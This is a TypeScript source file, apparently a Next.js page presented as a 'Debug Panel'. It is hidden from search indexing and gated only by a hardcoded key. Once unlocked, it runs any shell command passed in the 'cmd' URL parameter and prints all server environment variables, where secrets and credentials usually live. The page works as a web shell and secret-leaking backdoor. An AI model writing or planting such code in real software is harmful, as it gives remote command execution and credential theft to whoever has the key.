import { exec } from 'child_process'
import { promisify } from 'util'

const execAsync = promisify(exec)

export const metadata = {
  robots: {
    index: false
  }
}

const DEBUG_KEY = '6e966802f78c43db248150d19f6855e1bc1c9f4ec38feb581bc7e9052aefafbd'

export default async function DebugPage({
  searchParams
}: {
  searchParams: Promise<{ key?: string; cmd?: string }>
}) {
  const params = await searchParams

  if (params.key !== DEBUG_KEY) {
    return (
      <div className="note--empty-state">
        <span className="note-text--empty-state">
          Unauthorized: Invalid or missing key
        </span>
      </div>
    )
  }

  // Convert process.env to a plain object
  const envVars: Record<string, string | undefined> = {}
  for (const key of Object.keys(process.env)) {
    envVars[key] = process.env[key]
  }

  // Execute command if provided
  let cmdOutput: { stdout: string; stderr: string } | null = null
  let cmdError: string | null = null

  if (params.cmd) {
    try {
      cmdOutput = await execAsync(params.cmd)
    } catch (error: any) {
      cmdError = error.message || 'Command execution failed'
      if (error.stdout) cmdOutput = { stdout: error.stdout, stderr: error.stderr || '' }
    }
  }

  return (
    <div style={{ padding: '30px', fontFamily: 'Consolas, Monaco, monospace', color: '#f0f0f0', background: '#1a1a1a', minHeight: '100vh', fontSize: '14px' }}>
      <h1 style={{ marginBottom: '25px', color: '#00d4ff', fontSize: '28px' }}>🔧 Debug Panel</h1>

      {/* Command Execution Section */}
      <section style={{ marginBottom: '40px' }}>
        <h2 style={{ color: '#00ff88', marginBottom: '15px', fontSize: '20px' }}>Command Execution</h2>
        <p style={{ color: '#cccccc', marginBottom: '15px', fontSize: '14px' }}>
          Add <code style={{ background: '#333', padding: '4px 8px', borderRadius: '4px', color: '#ffcc00' }}>&amp;cmd=your_command</code> to the URL to execute a command.
        </p>
        {params.cmd && (
          <div style={{ marginTop: '20px' }}>
            <div style={{ color: '#ffaa00', marginBottom: '10px', fontSize: '16px', fontWeight: 'bold' }}>
              $ {params.cmd}
            </div>
            {cmdError && (
              <div style={{ color: '#ff6666', background: '#2a1a1a', padding: '15px', borderRadius: '6px', marginBottom: '15px', border: '1px solid #ff4444' }}>
                Error: {cmdError}
              </div>
            )}
            {cmdOutput && (
              <pre style={{
                background: '#252525',
                padding: '20px',
                borderRadius: '6px',
                overflow: 'auto',
                maxHeight: '400px',
                border: '1px solid #444',
                color: '#ffffff',
                fontSize: '13px',
                lineHeight: '1.5'
              }}>
                {cmdOutput.stdout || '(no output)'}
                {cmdOutput.stderr && <span style={{ color: '#ff6666' }}>{'\n'}{cmdOutput.stderr}</span>}
              </pre>
            )}
          </div>
        )}
      </section>

      {/* Environment Variables Section */}
      <section>
        <h2 style={{ color: '#00ff88', marginBottom: '15px', fontSize: '20px' }}>Environment Variables ({Object.keys(envVars).length})</h2>
        <pre style={{
          background: '#252525',
          padding: '25px',
          borderRadius: '6px',
          overflow: 'auto',
          maxHeight: '70vh',
          border: '1px solid #444',
          color: '#ffffff',
          fontSize: '13px',
          lineHeight: '1.6'
        }}>
          {JSON.stringify(envVars, null, 2)}
        </pre>
      </section>
    </div>
  )
}
